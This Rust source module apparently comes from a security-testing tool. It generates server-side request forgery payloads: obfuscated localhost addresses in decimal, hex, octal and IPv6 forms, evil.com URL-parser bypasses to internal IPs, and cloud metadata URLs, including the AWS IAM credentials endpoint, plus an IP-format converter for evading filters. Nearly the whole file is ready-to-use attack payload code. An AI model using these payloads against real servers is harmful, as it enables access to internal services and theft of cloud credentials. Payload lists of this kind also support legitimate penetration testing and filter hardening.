//! SSRF (Server-Side Request Forgery) payloads

/// SSRF bypass variants
#[derive(Debug, Clone)]
pub struct SsrfPayload {
    pub name: String,
    pub url: String,
}

impl SsrfPayload {
    pub fn new(name: &str, url: &str) -> Self {
        Self {
            name: name.to_string(),
            url: url.to_string(),
        }
    }
}

/// Generate localhost bypass variants
pub fn localhost_variants(port: u16) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("localhost", &format!("http://localhost:{}", port)),
        SsrfPayload::new("127.0.0.1", &format!("http://127.0.0.1:{}", port)),
        SsrfPayload::new("127.1", &format!("http://127.1:{}", port)),
        SsrfPayload::new("0.0.0.0", &format!("http://0.0.0.0:{}", port)),
        SsrfPayload::new("0", &format!("http://0:{}", port)),
        SsrfPayload::new("IPv6 localhost", &format!("http://[::1]:{}", port)),
        SsrfPayload::new("IPv6 zero", &format!("http://[::]:{}", port)),
        SsrfPayload::new("Decimal", &format!("http://2130706433:{}", port)), // 127.0.0.1 in decimal
        SsrfPayload::new("Hex", &format!("http://0x7f000001:{}", port)),
        SsrfPayload::new("Octal", &format!("http://0177.0.0.1:{}", port)),
    ]
}

/// Internal network bypass variants
pub fn internal_network_variants(ip: &str, port: u16) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("Direct", &format!("http://{}:{}", ip, port)),
        SsrfPayload::new("@ bypass", &format!("http://evil.com@{}:{}", ip, port)),
        SsrfPayload::new("# bypass", &format!("http://evil.com#{}:{}", ip, port)),
        SsrfPayload::new("? bypass", &format!("http://evil.com?{}:{}", ip, port)),
    ]
}

/// Cloud metadata endpoints
pub fn cloud_metadata_endpoints() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("AWS metadata", "http://169.254.169.254/latest/meta-data/"),
        SsrfPayload::new(
            "AWS credentials",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
        SsrfPayload::new(
            "GCP metadata",
            "http://metadata.google.internal/computeMetadata/v1/",
        ),
        SsrfPayload::new("Azure metadata", "http://169.254.169.254/metadata/instance"),
        SsrfPayload::new("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
    ]
}

/// Convert IP to different formats for bypass
pub fn ip_to_formats(ip: &str) -> Vec<String> {
    let parts: Vec<u8> = ip.split('.').filter_map(|s| s.parse().ok()).collect();
    if parts.len() != 4 {
        return vec![ip.to_string()];
    }

    let decimal = u32::from_be_bytes([parts[0], parts[1], parts[2], parts[3]]);

    vec![
        ip.to_string(),
        format!("{}", decimal),
        format!("0x{:08x}", decimal),
        format!(
            "0{:o}.0{:o}.0{:o}.0{:o}",
            parts[0], parts[1], parts[2], parts[3]
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_localhost_variants() {
        let variants = localhost_variants(8080);
        assert!(!variants.is_empty());
        assert!(variants.iter().any(|v| v.url.contains("localhost")));
    }

    #[test]
    fn test_ip_formats() {
        let formats = ip_to_formats("127.0.0.1");
        assert!(formats.contains(&"127.0.0.1".to_string()));
        assert!(formats.contains(&"2130706433".to_string()));
    }
}
